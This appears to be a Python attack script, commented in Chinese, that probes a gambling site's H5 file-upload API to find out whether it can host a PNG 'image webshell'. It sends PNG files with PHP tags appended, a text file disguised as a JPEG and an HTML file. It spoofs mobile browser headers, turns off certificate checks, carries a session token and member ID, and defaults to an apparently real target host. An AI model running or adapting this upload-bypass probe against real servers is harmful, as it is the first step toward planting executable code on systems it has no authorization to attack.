#!/usr/bin/env python3
# 白牌包网 H5 上传契约探针 / 图片马托管
# usage: upload_probe.py <base_url> <token> <timestamp> <customerUID> [name]
import sys, ssl, time, uuid, json, urllib.request, urllib.error
# ---- 参数守卫（无参数必须给出人话，不抛 traceback、不朝真实目标发包）----
import sys as _sys, os as _os
if len(_sys.argv) < 2:
    _u = '<参数...>'
    print("用法: " + _os.path.basename(__file__) + " " + _u, file=_sys.stderr)
    raise SystemExit(1)
# ---- 守卫结束 ----


ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
BASE = sys.argv[1].rstrip('/') if len(sys.argv) > 1 else "https://t1xlws1.lqecey.com"
TOK  = sys.argv[2] if len(sys.argv) > 2 else "<TOKEN>"
TS   = sys.argv[3] if len(sys.argv) > 3 else "<13or16位TS>"
CUID = sys.argv[4] if len(sys.argv) > 4 else "<MEMBERID>"
NAME = sys.argv[5] if len(sys.argv) > 5 else "pp_trade_img"

PNG = bytes.fromhex('89504e470d0a1a0a0000000d494844520000000100000001'
                    '08060000001f15c4890000000d49444154789c6360000002'
                    '000100ffff03000006000557bfabd40000000049454e44ae426082')

def multipart(fields, files):
    b = '----WebKitFormBoundary' + uuid.uuid4().hex[:16]
    out = bytearray()
    for k, v in fields:
        out += f'--{b}\r\nContent-Disposition: form-data; name="{k}"\r\n\r\n{v}\r\n'.encode()
    for k, (fn, data, ct) in files:
        out += (f'--{b}\r\nContent-Disposition: form-data; name="{k}"; '
                f'filename="{fn}"\r\nContent-Type: {ct}\r\n\r\n').encode() + data + b'\r\n'
    out += f'--{b}--\r\n'.encode()
    return bytes(out), f'multipart/form-data; boundary={b}'

def post(path, fields, files, extra=None):
    body, ct = multipart(fields, files)
    hdr = {'token': TOK, 'timestamp': TS, 'device': 'h5', 'customerUID': CUID,
           'Content-Type': ct, 'Accept': 'application/json, text/plain, */*',
           'Origin': BASE, 'Referer': BASE + '/',
           'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/120 Mobile Safari/537.36'}
    if extra: hdr.update(extra)
    r = urllib.request.Request(BASE + path, data=body, headers=hdr, method='POST')
    t0 = time.time()
    try:
        with urllib.request.urlopen(r, timeout=25, context=ctx) as resp:
            return resp.status, resp.read(), time.time() - t0
    except urllib.error.HTTPError as e:
        return e.code, e.read(), time.time() - t0
    except Exception as e:
        return 0, str(e).encode(), time.time() - t0

CASES = [
    # (label, filename, content, content-type)
    ('baseline png',        'p.png', PNG,                                     'image/png'),
    ('png + <?= short tag', 'p2.png', PNG + b'<?= "P".(7*7) ?>',              'image/png'),
    ('png + <?php (WAF)',   'p3.png', PNG + b'<?php echo "P".(7*7); ?>',      'image/png'),
    ('plain text as jpg',   'p4.jpg', b'HELLO-NOT-AN-IMAGE',                  'image/jpeg'),
    ('html',                'p5.html', b'<h1>x</h1>',                         'text/html'),
]

if __name__ == '__main__':
    for label, fn, data, ct in CASES:
        st, b, dt = post('/api/v1/upload/file', [('name', NAME)], [('file', (fn, data, ct))])
        print(f'### {label:22s} {fn:10s} -> {st} {dt:.2f}s')
        print('   ', b[:300].decode('utf-8', 'replace').replace('\n', ' '))
        time.sleep(1.6)

